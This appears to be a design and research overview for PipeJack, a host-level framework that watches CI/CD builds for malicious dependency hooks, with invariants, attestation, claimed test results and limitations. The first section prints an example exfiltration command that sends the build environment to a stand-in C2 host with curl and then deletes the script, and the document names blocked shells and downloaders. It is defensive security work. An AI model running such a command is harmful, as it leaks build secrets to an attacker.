# PipeJack: Research Framing & Architectural Contribution

## 1. The Build-Time Supply Chain Blind Spot

Continuous Integration and Continuous Delivery (CI/CD) pipelines serve as the primary manufacturing plant for modern software. However, the build execution phase itself represents an architectural blind spot in contemporary security engineering:

```
  Source Repository             Build Execution Window                 Container Registry
┌──────────────────┐        ┌────────────────────────────┐        ┌────────────────────────┐
│ Static Scanning  ├───────►│  Untrusted Lifecycle Hooks ├───────►│ Post-Build Image Scan  │
│ (SAST / SCA)     │        │  (npm postinstall, setup)  │        │ (CVE layer scanners)   │
└──────────────────┘        └──────────────┬─────────────┘        └────────────────────────┘
                                           │
                                ⚠️ Execution Blind Spot
                                • Arbitrary code as root
                                • Secret exfiltration via curl
                                • In-situ source tampering
```

While organizations deploy static application security testing (SAST) and software composition analysis (SCA) to inspect source repositories, and vulnerability scanners to inspect stored container images, **neither control monitors or polices what dependencies actually execute while inside the worker container**. Adversaries exploit this gap to run transient attack scripts (`curl -d "$ENV" http://c2 && rm /tmp/script`) that evade both pre-build static scanners and post-build image scanners.

---

## 2. Architectural Design Goals

PipeJack addresses this challenge through an integrated host-assisted, zero-trust enforcement framework designed around four core engineering principles:

1. **Host-Level Isolation (Out-of-Band Observation)**: Security monitoring must execute outside the untrusted build container's user space, preventing in-container scripts running as `root` from disabling or blinding sensors.
2. **Multi-Sensor Defense-in-Depth**: Invariants must be enforced across multiple orthogonal systems layers—processes, filesystem trees, and network egress—rather than relying on a single detection vector.
3. **Deterministic Gatekeeping (Automated Quarantine)**: Malicious builds must be stopped deterministically prior to deployment or release, tagging contaminated artifacts with quarantine labels to prevent supply chain poisoning.
4. **Non-Repudiable Cryptographic Evidence**: Every build must yield a verifiable attestation record signed with host private keys and linked to historical builds via a tamper-evident hash chain.

---

## 3. Comparison with Existing Industry Approaches

| Approach | Typical Tools | Strengths | Failure Mode in Build Environments |
| :--- | :--- | :--- | :--- |
| **Static Code Analysis (SAST)** | SonarQube, Semgrep | Catches known unsafe coding patterns in application source. | Completely blind to dynamic runtime scripts or second-stage payloads downloaded during compilation. |
| **Dependency Scanning (SCA)** | Snyk, Dependabot | Identifies known CVEs in declared package manifests. | Incapable of detecting zero-day malicious lifecycle hooks in unindexed or typosquatted packages. |
| **Image Vulnerability Scanning** | Trivy, Grype, Clair | Detects outdated packages in static OCI container layers. | Cannot detect ephemeral actions (e.g. credential exfiltration or in-memory tampering) that leave no resting file artifacts. |
| **In-Container Runtime Agents** | Falco (in-container), custom wrappers | Intercepts system calls inside container. | Vulnerable to tampering or killing by container root; high performance overhead if injected into every worker. |
| **PipeJack Architecture** | Host-level daemon (`pipejackd`) | Enforces invariants from host kernel via cgroups, iptables, and Merkle diffs. | Immune to in-container evasion; provides deterministic quarantine and signed cryptographic attestation. |

---

## 4. Multi-Sensor Security Invariants

PipeJack enforces three non-negotiable invariants during compilation:

### A. The Process Allowlist Invariant
All binaries spawned within the container cgroup must match the declared policy allowlist. The Process Tree Differ (`proctree`) maps `/proc` within the cgroup v2 scope at a 150ms sampling interval, resolving canonical executable paths and blocking rogue interpreters (`/bin/sh`), downloaders (`curl`), or shells.

### B. The Filesystem Immutability Invariant
Source code present at build inception must remain bit-for-bit identical at build completion. The Filesystem Baseline engine (`fschecker`) calculates pre- and post-build SHA-256 Merkle tree roots, validating that mutations are confined strictly to compiler output directories (`target/**`, `dist/**`) and aborting on source modifications (`src/**`).

### C. The Network Isolation Invariant
Build processes must not open arbitrary outbound connections. PipeJack injects a dedicated `PIPEJACK_EGRESS` iptables chain directly into the build container's network namespace, dropping outbound SYN packets to non-loopback destinations while passive socket monitors (`netmon`) audit open socket inodes.

---

## 5. Provenance & Cryptographic Attestation

To establish immutable supply chain provenance, PipeJack generates an Ed25519-signed cryptographic attestation record for each build:

$$\text{self\_hash} = \text{SHA256}(\text{CanonicalJSON}(\text{metadata}, \text{verdict}, \text{violations}, \text{prev\_hash}))$$

$$\text{signature} = \text{Ed25519\_Sign}(\text{PrivKey}_{\text{host}}, \text{self\_hash})$$

Every record incorporates the `self_hash` of the preceding build, creating an append-only, tamper-evident Merkle hash chain. Modifying or deleting any historical record invalidates the signature and chain continuity of all subsequent builds.

---

## 6. Experimental Validation & Results

The architecture was experimentally validated across 7 real-world adversarial supply chain vectors:

- **Scenarios 01–06 (Direct Violations)**: Unauthorized shell execution, curl exfiltration, source tampering, base64 obfuscation, multi-stage droppers, and trickle exfiltration all triggered immediate deterministic policy violations (`BLOCK`), leading to image quarantine and deployment blocking.
- **Scenario 07 (Statistical Anomaly)**: Abnormal process counts and file mutations triggered \(|z| > 3.0\) telemetry anomalies. Under default policy, anomaly findings are recorded into the signed attestation ledger in advisory mode; when `anomaly_block: true` is configured, it promotes to a hard quarantine.
- **Attestation Ledger Audit**: Verified across 282+ consecutive historical builds with zero broken chain links or invalid signatures.

---

## 7. Limitations & Future Directions

1. **Kernel-Portability vs Zero-Latency Tradeoff**: The current production daemon relies on 150ms cgroup v2 `/proc` polling for broad Linux portability. While effective against all tested multi-step attacks, sub-150ms ephemeral bursts theoretically could evade sampling. Future work centers on promoting our vendored eBPF tracepoint controllers (`ebpfctrl/`) to the default engine.
2. **In-Memory Non-Disk Attacks**: Reflective attacks operating entirely within the memory space of an authorized Java, Node, or Python runtime without touching disk or spawning child processes require in-runtime language instrumentation.
3. **Hardware-Backed Cryptography**: Integrating Hardware Security Modules (HSM) or TPM 2.0 to secure the Ed25519 private signing keys against host-level compromise.
